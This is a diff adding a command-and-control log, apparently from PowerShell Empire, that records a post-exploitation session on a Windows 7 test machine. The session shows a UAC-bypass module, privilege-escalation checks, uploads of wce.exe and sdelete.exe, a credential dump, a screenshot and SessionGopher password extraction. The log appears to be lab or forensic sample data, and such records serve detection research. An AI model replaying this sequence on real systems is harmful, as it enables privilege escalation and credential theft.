@@ -1,0 +1,439 @@
+
+2018-01-26 02:02:40 : 
+
+[*] Agent info:
+  nonce           	0102601837304513
+  jitter          	0.0
+  servers         	None
+  internal_ip     	192.168.1.1
+  working_hours   	
+  session_key     	Xn)]q6|P^$e6Nl3%fyZOFS?.pmjp~zak
+  children        	None
+  checkin_time    	2018-01-26 02:02:20
+  hostname        	IE8WIN7
+  id              	1
+  delay           	5
+  username        	IE8Win7\IEUser
+  kill_date       	
+  parent          	None
+  process_name    	powershell
+  listener        	http
+  process_id      	2216
+  profile         	/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT
+                                6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+  os_details      	Microsoft Windows 7 Enterprise
+  lost_limit      	60
+  taskings        	None
+  name            	6GXFSZN3
+  language        	powershell
+  external_ip     	192.168.1.3
+  session_id      	6GXFSZN3
+  lastseen_time   	2018-01-26 02:02:20
+  language_version	2
+  high_integrity  	0
+
+
+[+] Agent 6GXFSZN3 now active:
+
+
+2018-01-26 02:04:44 : 
+Tasked agent to run module powershell/privesc/bypassuac_eventvwr
+
+2018-01-26 02:04:48 : 
+Job started: 18MXFG
+
+2018-01-26 02:06:23 : 
+Tasked agent to run module powershell/privesc/powerup/allchecks
+
+2018-01-26 02:06:29 : 
+Job started: H78RS4
+
+2018-01-26 02:10:15 : 
+
+[*] Running Invoke-AllChecks
+
+
+[*] Checking if user is in a local group with administrative privileges...
+[+] User is in a local group that grants administrative privileges!
+[+] Run a BypassUAC attack to elevate privileges to admin.
+
+
+[*] Checking for unquoted service paths...
+
+
+[*] Checking service executable and argument permissions...
+
+
+[*] Checking service permissions...
+
+
+[*] Checking %PATH% for potentially hijackable DLL locations...
+
+
+[*] Checking for AlwaysInstallElevated registry key...
+
+
+[*] Checking for Autologon credentials in registry...
+
+
+DefaultDomainName    : IE8WIN7
+DefaultUserName      : IEUser
+DefaultPassword      : 
+AltDefaultDomainName : 
+AltDefaultUserName   : 
+AltDefaultPassword   : 
+
+
+
+
+
+[*] Checking for modifidable registry autoruns and configs...
+
+
+[*] Checking for modifiable schtask files/configs...
+
+
+[*] Checking for unattended install files...
+
+
+[*] Checking for encrypted web.config strings...
+
+
+[*] Checking for encrypted application pool and virtual directory passwords...
+
+
+[*] Checking for plaintext passwords in McAfee SiteList.xml files....
+
+
+
+
+[*] Checking for cached Group Policy Preferences .xml files....
+
+
+
+
+
+Invoke-AllChecks completed!
+
+
+2018-01-26 02:10:47 : 
+Tasked agent to upload /tmp/sdelete.exe : c74673589d5dd38b6443da6054b8dd7a
+
+2018-01-26 02:11:09 : 
+Tasked agent to upload /tmp/sdelete.exe : c74673589d5dd38b6443da6054b8dd7a
+
+2018-01-26 02:11:20 : 
+[!] Error response: [!] Error in writing file during upload
+
+2018-01-26 02:14:34 : 
+Tasked agent to run module powershell/privesc/bypassuac_eventvwr
+
+2018-01-26 02:14:43 : 
+Job started: R47FNW
+
+2018-01-26 02:15:46 : 
+Tasked agent to get running jobs
+
+2018-01-26 02:15:48 : 
+Running Jobs:
+
+
+2018-01-26 02:29:33 : 
+Tasked agent to run command ls
+
+2018-01-26 02:29:36 : 
+Tasked agent to run command dir
+
+2018-01-26 02:30:07 : 
+LastWriteTime              length                     Name                     
+-------------              ------                     ----                     
+10/23/2013 9:22:48 AM                                 AppData                  
+10/23/2013 9:22:48 AM                                 Application Data         
+11/23/2014 9:10:14 PM                                 Contacts                 
+10/23/2013 9:22:48 AM                                 Cookies                  
+1/25/2018 5:59:12 PM                                  Desktop                  
+11/23/2014 9:10:14 PM                                 Documents                
+11/23/2014 9:10:14 PM                                 Downloads                
+11/23/2014 9:10:14 PM                                 Favorites                
+11/23/2014 9:10:15 PM                                 Links                    
+10/23/2013 9:22:48 AM                                 Local Settings           
+11/23/2014 9:10:14 PM                                 Music                    
+10/23/2013 9:22:48 AM                                 My Documents             
+10/23/2013 9:22:48 AM                                 NetHood                  
+11/23/2014 9:10:14 PM                                 Pictures                 
+10/23/2013 9:22:48 AM                                 PrintHood                
+10/23/2013 9:22:48 AM                                 Recent                   
+11/23/2014 9:10:14 PM                                 Saved Games              
+11/23/2014 9:10:14 PM                                 Searches                 
+10/23/2013 9:22:48 AM                                 SendTo                   
+10/23/2013 9:22:48 AM                                 Start Menu               
+10/23/2013 9:22:48 AM                                 Templates                
+11/23/2014 9:10:14 PM                                 Videos                   
+1/25/2018 6:20:24 PM       786432                     NTUSER.DAT               
+1/25/2018 6:20:24 PM       262144                     ntuser.dat.LOG1          
+10/23/2013 9:22:48 AM      0                          ntuser.dat.LOG2          
+10/23/2013 10:27:30 AM     65536                      NTUSER.DAT{6cced2f1-6e01-
+                                                      11de-8bed-001e0bcd1824}.T
+                                                      M.blf                    
+10/23/2013 10:27:30 AM     524288                     NTUSER.DAT{6cced2f1-6e01-
+                                                      11de-8bed-001e0bcd1824}.T
+                                                      MContainer000000000000000
+                                                      00001.regtrans-ms        
+10/23/2013 10:27:30 AM     524288                     NTUSER.DAT{6cced2f1-6e01-
+                                                      11de-8bed-001e0bcd1824}.T
+                                                      MContainer000000000000000
+                                                      00002.regtrans-ms        
+10/23/2013 9:22:48 AM      20                         ntuser.ini               
+1/25/2018 6:10:56 PM       151200                     sdelete.exe
+
+2018-01-26 02:30:13 : 
+LastWriteTime              length                     Name                     
+-------------              ------                     ----                     
+10/23/2013 9:22:48 AM                                 AppData                  
+10/23/2013 9:22:48 AM                                 Application Data         
+11/23/2014 9:10:14 PM                                 Contacts                 
+10/23/2013 9:22:48 AM                                 Cookies                  
+1/25/2018 5:59:12 PM                                  Desktop                  
+11/23/2014 9:10:14 PM                                 Documents                
+11/23/2014 9:10:14 PM                                 Downloads                
+11/23/2014 9:10:14 PM                                 Favorites                
+11/23/2014 9:10:15 PM                                 Links                    
+10/23/2013 9:22:48 AM                                 Local Settings           
+11/23/2014 9:10:14 PM                                 Music                    
+10/23/2013 9:22:48 AM                                 My Documents             
+10/23/2013 9:22:48 AM                                 NetHood                  
+11/23/2014 9:10:14 PM                                 Pictures                 
+10/23/2013 9:22:48 AM                                 PrintHood                
+10/23/2013 9:22:48 AM                                 Recent                   
+11/23/2014 9:10:14 PM                                 Saved Games              
+11/23/2014 9:10:14 PM                                 Searches                 
+10/23/2013 9:22:48 AM                                 SendTo                   
+10/23/2013 9:22:48 AM                                 Start Menu               
+10/23/2013 9:22:48 AM                                 Templates                
+11/23/2014 9:10:14 PM                                 Videos                   
+1/25/2018 6:20:24 PM       786432                     NTUSER.DAT               
+1/25/2018 6:20:24 PM       262144                     ntuser.dat.LOG1          
+10/23/2013 9:22:48 AM      0                          ntuser.dat.LOG2          
+10/23/2013 10:27:30 AM     65536                      NTUSER.DAT{6cced2f1-6e01-
+                                                      11de-8bed-001e0bcd1824}.T
+                                                      M.blf                    
+10/23/2013 10:27:30 AM     524288                     NTUSER.DAT{6cced2f1-6e01-
+                                                      11de-8bed-001e0bcd1824}.T
+                                                      MContainer000000000000000
+                                                      00001.regtrans-ms        
+10/23/2013 10:27:30 AM     524288                     NTUSER.DAT{6cced2f1-6e01-
+                                                      11de-8bed-001e0bcd1824}.T
+                                                      MContainer000000000000000
+                                                      00002.regtrans-ms        
+10/23/2013 9:22:48 AM      20                         ntuser.ini               
+1/25/2018 6:10:56 PM       151200                     sdelete.exe
+
+2018-01-26 02:30:26 : 
+Tasked agent to run command dir
+
+2018-01-26 02:30:29 : 
+LastWriteTime              length                     Name                     
+-------------              ------                     ----                     
+10/23/2013 9:22:48 AM                                 AppData                  
+10/23/2013 9:22:48 AM                                 Application Data         
+11/23/2014 9:10:14 PM                                 Contacts                 
+10/23/2013 9:22:48 AM                                 Cookies                  
+1/25/2018 5:59:12 PM                                  Desktop                  
+11/23/2014 9:10:14 PM                                 Documents                
+11/23/2014 9:10:14 PM                                 Downloads                
+11/23/2014 9:10:14 PM                                 Favorites                
+11/23/2014 9:10:15 PM                                 Links                    
+10/23/2013 9:22:48 AM                                 Local Settings           
+11/23/2014 9:10:14 PM                                 Music                    
+10/23/2013 9:22:48 AM                                 My Documents             
+10/23/2013 9:22:48 AM                                 NetHood                  
+11/23/2014 9:10:14 PM                                 Pictures                 
+10/23/2013 9:22:48 AM                                 PrintHood                
+10/23/2013 9:22:48 AM                                 Recent                   
+11/23/2014 9:10:14 PM                                 Saved Games              
+11/23/2014 9:10:14 PM                                 Searches                 
+10/23/2013 9:22:48 AM                                 SendTo                   
+10/23/2013 9:22:48 AM                                 Start Menu               
+10/23/2013 9:22:48 AM                                 Templates                
+11/23/2014 9:10:14 PM                                 Videos                   
+1/25/2018 6:20:24 PM       786432                     NTUSER.DAT               
+1/25/2018 6:20:24 PM       262144                     ntuser.dat.LOG1          
+10/23/2013 9:22:48 AM      0                          ntuser.dat.LOG2          
+10/23/2013 10:27:30 AM     65536                      NTUSER.DAT{6cced2f1-6e01-
+                                                      11de-8bed-001e0bcd1824}.T
+                                                      M.blf                    
+10/23/2013 10:27:30 AM     524288                     NTUSER.DAT{6cced2f1-6e01-
+                                                      11de-8bed-001e0bcd1824}.T
+                                                      MContainer000000000000000
+                                                      00001.regtrans-ms        
+10/23/2013 10:27:30 AM     524288                     NTUSER.DAT{6cced2f1-6e01-
+                                                      11de-8bed-001e0bcd1824}.T
+                                                      MContainer000000000000000
+                                                      00002.regtrans-ms        
+10/23/2013 9:22:48 AM      20                         ntuser.ini               
+1/25/2018 6:10:56 PM       151200                     sdelete.exe
+
+2018-01-26 02:32:48 : 
+Tasked agent to run command whoami
+
+2018-01-26 02:32:52 : 
+IE8Win7\IEUser
+
+2018-01-26 02:33:57 : 
+[*] Tasked agent 6GXFSZN3 to run net user
+
+2018-01-26 02:34:07 : 
+Tasked agent to run shell command net user
+
+2018-01-26 02:34:14 : 
+User accounts for \\IE8WIN7
+
+-------------------------------------------------------------------------------
+Administrator            Guest                    IEUser                   
+The command completed successfully.
+
+
+..Command execution completed.
+
+2018-01-26 02:34:32 : 
+Tasked agent to run shell command net user IEUser
+
+2018-01-26 02:34:36 : 
+User name                    IEUser
+Full Name                    
+Comment                      
+User's comment               
+Country code                 000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/23/2013 8:22:40 AM
+Password expires             Never
+Password changeable          10/23/2013 8:22:40 AM
+Password required            No
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   1/25/2018 7:29:54 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *HomeUsers            
+Global Group memberships     *None                 
+The command completed successfully.
+
+
+..Command execution completed.
+
+2018-01-26 02:34:48 : 
+Tasked agent to run shell command ipconfig /all
+
+2018-01-26 02:34:54 : 
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : IE8Win7
+   Primary Dns Suffix  . . . . . . . : 
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : localdomain
+
+Ethernet adapter Local Area Connection 2:
+
+   Connection-specific DNS Suffix  . : localdomain
+   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
+   Physical Address. . . . . . . . . : 00-0C-29-3A-7B-72
+   DHCP Enabled. . . . . . . . . . . : Yes
+   Autoconfiguration Enabled . . . . : Yes
+   Link-local IPv6 Address . . . . . : fe80::2416:6a9d:8315:dd63%18(Preferred) 
+   IPv4 Address. . . . . . . . . . . : 192.168.1.1(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Lease Obtained. . . . . . . . . . : Thursday, January 25, 2018 5:31:12 PM
+   Lease Expires . . . . . . . . . . : Thursday, January 25, 2018 7:01:13 PM
+   Default Gateway . . . . . . . . . : 192.168.1.2
+   DHCP Server . . . . . . . . . . . : 192.168.1.254
+   DHCPv6 IAID . . . . . . . . . . . : 301993001
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-19-F9-AF-00-00-15-5D-E6-C5-E3
+   DNS Servers . . . . . . . . . . . : 192.168.126.2
+   Primary WINS Server . . . . . . . : 192.168.126.2
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+Tunnel adapter isatap.localdomain:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : localdomain
+   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
+   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+
+..Command execution completed.
+
+2018-01-26 02:35:12 : 
+Tasked agent to upload /tmp/wce.exe : c0ec10a8bd525ba10254b857f406ec36
+
+2018-01-26 02:35:55 : 
+Tasked agent to run shell command wce.exe > dump.txt
+
+2018-01-26 02:36:40 : 
+Tasked agent to run shell command net user
+
+2018-01-26 02:36:46 : 
+User accounts for \\IE8WIN7
+
+-------------------------------------------------------------------------------
+Administrator            Guest                    IEUser                   
+The command completed successfully.
+
+
+..Command execution completed.
+
+2018-01-26 02:38:58 : 
+Tasked agent to run module powershell/collection/screenshot
+
+2018-01-26 02:39:15 : 
+Output saved to ./downloads/6GXFSZN3/screenshot/IE8WIN7_2018-01-26_02-39-15.png
+
+2018-01-26 02:40:03 : 
+Tasked agent to run module powershell/credentials/sessiongopher
+
+2018-01-26 02:40:10 : 
+
+          o_       
+         /  ".   SessionGopher - RDP, WinSCP, FileZilla, PuTTY, SuperPuTTY, 
+       ,"  _-"      .sdtid, .rdp, .ppk saved session & password extractor
+     ,"   m m         
+  ..+     )      Brandon Arvanaghi
+     `m..m       Twitter: @arvanaghi | arvanaghi.com
+  
+
+2018-01-26 02:44:19 : 
+Tasked agent to run shell command dir
+
+2018-01-26 02:44:25 : 
+Directory: C:\Users\IEUser
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+d-r--        11/23/2014   9:10 PM            Contacts                          
+d-r--         1/25/2018   5:59 PM            Desktop                           
+d-r--        11/23/2014   9:10 PM            Documents                         
+d-r--        11/23/2014   9:10 PM            Downloads                         
+d-r--        11/23/2014   9:10 PM            Favorites                         
+d-r--        11/23/2014   9:10 PM            Links                             
+d-r--        11/23/2014   9:10 PM            Music                             
+d-r--        11/23/2014   9:10 PM            Pictures                          
+d-r--        11/23/2014   9:10 PM            Saved Games                       
+d-r--        11/23/2014   9:10 PM            Searches                          
+d-r--        11/23/2014   9:10 PM            Videos                            
+-a---         1/25/2018   6:10 PM     151200 sdelete.exe                       
+-a---         1/25/2018   6:35 PM     199168 wce.exe                           
+
+..Command execution completed.
+
+2018-01-26 03:15:28 : 
+Tasked agent to exit
